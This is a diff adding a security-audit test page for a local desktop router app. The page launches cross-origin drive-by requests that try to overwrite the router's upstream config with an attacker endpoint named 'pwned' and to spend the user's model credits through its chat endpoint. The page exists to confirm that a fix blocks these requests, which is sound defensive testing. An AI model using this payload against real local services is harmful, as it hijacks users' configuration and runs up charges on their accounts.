@@ -1,0 +1,73 @@
+<!doctype html>
+<!--
+  S-6 drive-by test page (security audit, eluvixrouter/eluvix).
+
+  Serve this page from a NON-local origin (the runner serves it from
+  http://127.0.0.2:39118 — a loopback address that is NOT on the
+  server's allowlist) and open it in
+  a browser while the Eluvix desktop server runs on 127.0.0.1:39117.
+  It performs the exact drive-by the audit's C-1 describes: cross-origin
+  POSTs that try to replace the router config and spend the user's
+  upstreams. Post-fix, every attempt must fail AND the server's config
+  must remain unchanged (the runner verifies that part with an
+  authenticated read-back).
+-->
+<html>
+<head><meta charset="utf-8"><title>S6 attacker page</title></head>
+<body>
+<h1>S-6 drive-by attempts</h1>
+<pre id="results">running…</pre>
+<script>
+  const TARGET = 'http://127.0.0.1:39117';
+  const markerConfig = JSON.stringify({
+    upstreams: [{
+      id: 'pwned',
+      name: 'pwned',
+      endpoint: 'http://127.0.0.2:39118',
+      models: ['*'],
+      priority: 1
+    }]
+  });
+  const lines = [];
+
+  async function attempt(name, url, options) {
+    try {
+      const res = await fetch(url, options);
+      let body = '';
+      try { body = await res.text(); } catch {}
+      lines.push(`${name}: HTTP ${res.status} ${body.slice(0, 120)}`);
+    } catch (err) {
+      // A rejected fetch is the expected post-fix outcome for cross-origin
+      // calls: either the preflight is refused (403) or the response
+      // carries no CORS grant. The request may still have REACHED the
+      // server for the simple-request case — which is why the runner
+      // separately verifies the config was not changed.
+      lines.push(`${name}: FETCH-REJECTED (${err && err.message ? err.message : err})`);
+    }
+  }
+
+  (async () => {
+    // A: "simple request" — no preflight; the browser sends it blind.
+    await attempt('A simple POST /api/config', `${TARGET}/api/config`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'text/plain' },
+      body: markerConfig
+    });
+    // B: JSON POST — triggers a CORS preflight first.
+    await attempt('B preflighted POST /api/config', `${TARGET}/api/config`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: markerConfig
+    });
+    // C: spend the user's upstreams.
+    await attempt('C POST /v1/chat/completions', `${TARGET}/v1/chat/completions`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ model: 'gpt-4o', messages: [{ role: 'user', content: 'hi' }] })
+    });
+    document.getElementById('results').textContent = lines.join('\n');
+    document.title = 'S6-DONE';
+  })();
+</script>
+</body>
+</html>
